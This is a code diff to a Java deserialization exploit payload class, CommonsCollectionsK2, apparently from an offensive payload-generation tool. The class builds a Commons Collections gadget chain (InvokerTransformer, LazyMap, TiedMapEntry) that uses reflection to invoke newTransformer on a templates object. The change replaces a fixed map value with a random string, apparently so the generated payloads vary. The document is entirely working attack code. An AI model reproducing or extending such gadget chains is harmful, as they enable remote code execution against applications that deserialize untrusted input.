@@ -7,6 +7,7 @@ import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
+import com.ppp.utils.RanDomUtils;
 import com.ppp.utils.Reflections;
 import org.apache.commons.collections4.functors.InvokerTransformer;
 import org.apache.commons.collections4.keyvalue.TiedMapEntry;
@@ -37,13 +38,15 @@ public class CommonsCollectionsK2 implements ObjectPayload<Object> {
     }
 
     public Object getChain(Object templates) throws Exception {
+        String s = RanDomUtils.generateRandomString(1);
+
         InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
         HashMap<String, String> innerMap = new HashMap();
         LazyMap lazyMap = LazyMap.lazyMap(innerMap, transformer);
 
         Map<Object, Object> hashMap = new HashMap();
         TiedMapEntry tied = new TiedMapEntry(lazyMap, templates);
-        hashMap.put(tied, "t");
+        hashMap.put(tied, s);
         innerMap.clear();
 
         Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
